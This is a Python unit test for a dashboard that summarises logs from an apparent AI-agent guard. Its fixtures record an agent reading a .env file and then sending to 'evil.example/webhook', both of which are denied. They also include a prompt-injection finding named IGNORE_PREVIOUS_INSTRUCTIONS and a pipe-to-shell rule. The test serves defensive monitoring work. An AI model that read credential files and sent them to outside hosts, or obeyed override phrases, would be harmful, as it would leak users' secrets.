import unittest
from pathlib import Path
import tempfile

from dashboard.app import (
    agent_source_counts,
    approval_rows,
    chain_graph_rows,
    chain_alert_rows,
    decision_counts,
    input_finding_rows,
    load_records,
    load_records_from_sources,
    output_finding_rows,
    timeline_rows,
)


class DashboardDataTests(unittest.TestCase):
    def test_dashboard_builds_counts_timeline_and_chain_rows(self):
        records = [
            {
                "event": {
                    "event_id": "evt-1",
                    "timestamp": "2026-01-01T00:00:00Z",
                    "agent_name": "miniagent",
                    "tool_name": "read_file",
                    "tool_args": {"path": ".env"},
                    "user_task": "debug",
                },
                "decision": {
                    "decision": "deny",
                    "risk_level": "critical",
                    "risk_score": 0.95,
                    "risk_types": ["sensitive_file_access"],
                    "matched_rules": ["SENSITIVE_PATH"],
                    "chain_alerts": [],
                    "chain_graphs": [],
                    "reason": "blocked",
                },
                "execution": {"executed": False, "result_preview": "Blocked"},
                "input_findings": [
                    {
                        "rule_id": "IGNORE_PREVIOUS_INSTRUCTIONS",
                        "risk_type": "prompt_injection",
                        "severity": "high",
                        "source": "user_task",
                        "reason": "input asks to ignore prior instructions",
                    }
                ],
                "output_findings": [],
                "redaction": {"applied": False, "redacted_types": []},
                "approval": {
                    "required": False,
                    "mode": "none",
                    "decision": "not_required",
                    "execute": False,
                    "operator": "system",
                    "reason": "",
                },
            },
            {
                "event": {
                    "event_id": "evt-2",
                    "timestamp": "2026-01-01T00:00:01Z",
                    "agent_name": "miniagent",
                    "tool_name": "send_message",
                    "tool_args": {"target": "https://evil.example/webhook"},
                    "user_task": "debug",
                },
                "decision": {
                    "decision": "deny",
                    "risk_level": "critical",
                    "risk_score": 0.95,
                    "risk_types": ["behavior_chain"],
                    "matched_rules": ["CHAIN_SENSITIVE_READ_TO_EXTERNAL_SEND"],
                    "chain_alerts": [
                        {
                            "chain_type": "SensitiveReadToExternalSend",
                            "source_event_id": "evt-1",
                            "sink_event_id": "evt-2",
                            "reason": "chain risk",
                        }
                    ],
                    "chain_graphs": [
                        {
                            "chain_id": "chain-evt-1-evt-2",
                            "chain_type": "SensitiveReadToExternalSend",
                            "severity": "critical",
                            "nodes": [
                                {"event_id": "evt-1", "tool_name": "read_file"},
                                {"event_id": "evt-2", "tool_name": "send_message"},
                            ],
                            "edges": [
                                {"from": "evt-1", "to": "evt-2", "relation": "sensitive_data_flow"}
                            ],
                            "reason": "chain risk",
                        }
                    ],
                    "reason": "chain risk",
                },
                "execution": {"executed": False, "result_preview": "Blocked"},
                "input_findings": [],
                "output_findings": [
                    {
                        "rule_id": "OUT_API_KEY",
                        "risk_type": "sensitive_output",
                        "severity": "high",
                        "secret_type": "api_key",
                        "reason": "tool result contains API key",
                    }
                ],
                "redaction": {"applied": True, "redacted_types": ["api_key"]},
                "approval": {
                    "required": True,
                    "mode": "auto-deny",
                    "decision": "user_denied",
                    "execute": False,
                    "operator": "system",
                    "reason": "auto-deny approval mode",
                },
            },
        ]

        self.assertEqual(decision_counts(records), {"deny": 2})
        self.assertEqual(timeline_rows(records)[0]["tool"], "read_file")
        self.assertEqual(timeline_rows(records)[1]["executed"], False)
        self.assertTrue(timeline_rows(records)[1]["redaction_applied"])
        self.assertEqual(timeline_rows(records)[1]["output_findings"], "api_key")
        self.assertTrue(timeline_rows(records)[1]["approval_required"])
        self.assertEqual(timeline_rows(records)[1]["approval_decision"], "user_denied")
        self.assertEqual(chain_alert_rows(records)[0]["chain_type"], "SensitiveReadToExternalSend")
        self.assertEqual(chain_graph_rows(records)[0]["relation"], "sensitive_data_flow")
        self.assertEqual(input_finding_rows(records)[0]["rule_id"], "IGNORE_PREVIOUS_INSTRUCTIONS")
        self.assertEqual(approval_rows(records)[0]["approval_decision"], "user_denied")
        self.assertEqual(output_finding_rows(records)[0]["secret_type"], "api_key")

    def test_dashboard_loads_multiple_sources_and_marks_demo_modes(self):
        with tempfile.TemporaryDirectory() as temp:
            tmpdir = Path(temp)
            mini_log = tmpdir / "mini.jsonl"
            core_log = tmpdir / "core.jsonl"
            mini_log.write_text(
                '{"event":{"event_id":"m1","agent_name":"miniagent","tool_name":"call_api","timestamp":"t","tool_args":{}},"decision":{"decision":"allow","risk_level":"low","risk_score":0.1,"risk_types":[],"matched_rules":[],"chain_alerts":[]},"execution":{"executed":true,"result_preview":"ok"}}\n',
                encoding="utf-8",
            )
            core_log.write_text(
                '{"event":{"event_id":"c1","agent_name":"corecoder","tool_name":"bash","timestamp":"t","tool_args":{}},"decision":{"decision":"deny","risk_level":"critical","risk_score":0.95,"risk_types":["dangerous_command"],"matched_rules":["CMD_PIPE_TO_SHELL"],"chain_alerts":[]},"execution":{"executed":false,"result_preview":"blocked"}}\n',
                encoding="utf-8",
            )

            records = load_records_from_sources(
                [
                    ("miniagent-scripted", mini_log, "mock-tools"),
                    ("corecoder-guarded-demo", core_log, "scripted-llm"),
                ]
            )

        self.assertEqual(len(records), 2)
        self.assertEqual(records[0]["_source"], "miniagent-scripted")
        self.assertEqual(records[0]["_execution_mode"], "mock-tools")
        self.assertEqual(records[1]["_source"], "corecoder-guarded-demo")
        self.assertEqual(agent_source_counts(records)["miniagent|miniagent-scripted"], 1)
        self.assertEqual(agent_source_counts(records)["corecoder|corecoder-guarded-demo"], 1)
        self.assertEqual(timeline_rows(records)[1]["source"], "corecoder-guarded-demo")
        self.assertEqual(timeline_rows(records)[1]["execution_mode"], "scripted-llm")


if __name__ == "__main__":
    unittest.main()
